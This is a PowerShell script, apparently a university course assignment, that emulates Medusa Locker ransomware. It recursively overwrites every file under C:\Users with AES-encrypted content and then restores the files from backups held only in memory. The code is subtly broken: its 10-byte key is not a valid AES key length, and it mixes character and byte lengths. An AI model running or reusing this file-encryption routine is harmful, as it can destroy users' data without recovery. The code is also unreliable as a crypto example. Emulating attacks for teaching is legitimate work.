<# Filename: Attack_1_File_Encryption.ps1
Author: Krishan Himesh Abeyrathne - 12217274 , Carl Khyncer Bhryn Yurong - 12224629
Subject: COIT11241 (Cyber Security Technologies)
Purpose: Emulation of Medusa Locker Attack using Phishing email - With Notepad #>
# Generate a unique encryption key
function Generate-EncryptionKey {
    param (
        [int] $keyLength = 16  # Default length for the encryption key
    )
    $key = [System.Guid]::NewGuid().ToString("N").Substring(0, $keyLength)
    return $key
}

# Function to encrypt content using a basic symmetric encryption
function Encrypt-Content {
    param (
        [string] $InputObject,
        [string] $Key
    )

    # Convert the key into a byte array
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

    # Create a simple symmetric encryption
    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.Key = $keyBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.GenerateIV()  # Generate a random IV for each encryption

    # Create an encryptor and encrypt the data
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
    $encryptedData = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($InputObject), 0, $InputObject.Length)

    # Return the IV and encrypted data as a concatenated byte array
    return [Convert]::ToBase64String($aes.IV) + ':' + [Convert]::ToBase64String($encryptedData)
}

# Function to simulate ransomware-style encryption of files in a specified directory
function Simulate-RansomwareEncryption {
    param (
        [string] $directoryPath = "C:\\Users",  # Default path for encryption
        [string] $encryptionKey  # Encryption key used for simulation
    )

    Write-Host "Simulating data encryption with file manipulation..." -ForegroundColor Yellow
    Write-Host "Encryption key: $encryptionKey" -ForegroundColor Green

    # Get all files in the specified directory
    $filesToEncrypt = Get-ChildItem -Path $directoryPath -Recurse -File

    # Backup original content for reset
    $fileBackups = @{}

    foreach ($file in $filesToEncrypt) {
        try {
            # Backup original content
            $originalContent = (Get-Content -Path $file.FullName -Raw)
            $fileBackups[$file.FullName] = $originalContent

            # Encrypt the content
            $encryptedContent = Encrypt-Content -InputObject $originalContent -Key $encryptionKey

            # Write the encrypted content back to the file
            Set-Content -Path $file.FullName -Value $encryptedContent

            Write-Host "File encrypted: $($file.FullName)" -ForegroundColor Green
        } catch {
            Write-Host "Error encrypting file: $($file.FullName). Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    Write-Host "Data encryption simulation completed." -ForegroundColor Green

    return $fileBackups  # Return the file backups for potential reset
}

# Function to reset files to their original state
function Reset-Files {
    param (
        [hashtable] $fileBackups
    )

    Write-Host "Resetting files to their original state..." -ForegroundColor Yellow

    foreach ($filePath in $fileBackups.Keys) {
        try {
            # Restore the original content
            Set-Content -Path $filePath -Value $fileBackups[$filePath]

            Write-Host "File reset: $filePath" -ForegroundColor Green
        } catch {
            Write-Host "Error resetting file: $filePath. Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    Write-Host "File reset process completed." -ForegroundColor Green
}

# Simulate the ransomware encryption process on the specified directory
$fileBackups = Simulate-RansomwareEncryption -directoryPath "C:\\Users" -encryptionKey "examplekey"

# After simulation, reset files to their original state
Reset-Files -fileBackups $fileBackups
